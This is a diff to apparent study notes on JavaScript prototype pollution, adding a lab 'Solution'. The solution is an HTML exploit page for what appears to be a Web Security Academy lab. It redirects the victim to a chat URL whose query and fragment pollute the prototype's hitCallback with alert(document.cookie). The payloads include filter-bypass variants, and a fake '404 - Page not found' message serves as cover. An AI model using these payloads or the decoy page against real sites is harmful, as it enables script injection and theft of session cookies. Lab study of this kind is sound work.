@@ -335,4 +335,15 @@ myArray.constructor.prototype         // Array.prototype
 
 ---------------
 
-- 
+- Solution-:
+
+```html
+<meta name="referrer" content="never">
+<script>
+location="https://0a62000303cbd84f8051f313000400dd.web-security-academy.net/chat?constructor[prototype][hitCallback]=alert(document.cookie)&constructor.prototype.hitCallback=alert(document.cookie)&__proto__.hitCallback=alert(document.cookie)&__proto__[hitCallback]=alert(document.cookie)&constrconstructoructor[prototype][hitCallback]=alert(document.cookie)&constrconstructoructor.prototype.hitCallback=alert(document.cookie)&__pro__proto__to__.hitCallback=alert(document.cookie)&__pro__proto__to__[hitCallback]=alert(document.cookie)#constructor[prototype][hitCallback]=alert(document.cookie)&constructor.prototype.hitCallback=alert(document.cookie)&__proto__.hitCallback=alert(document.cookie)&__proto__[hitCallback]=alert(document.cookie)&constrconstructoructor[prototype][hitCallback]=alert(document.cookie)&constrconstructoructor.prototype.hitCallback=alert(document.cookie)&__pro__proto__to__.hitCallback=alert(document.cookie)&__pro__proto__to__[hitCallback]=alert(document.cookie)"
+</script>
+<h1>404 - Page not found</h1>
+The URL you are requesting is no longer available
+```
+
+----------------
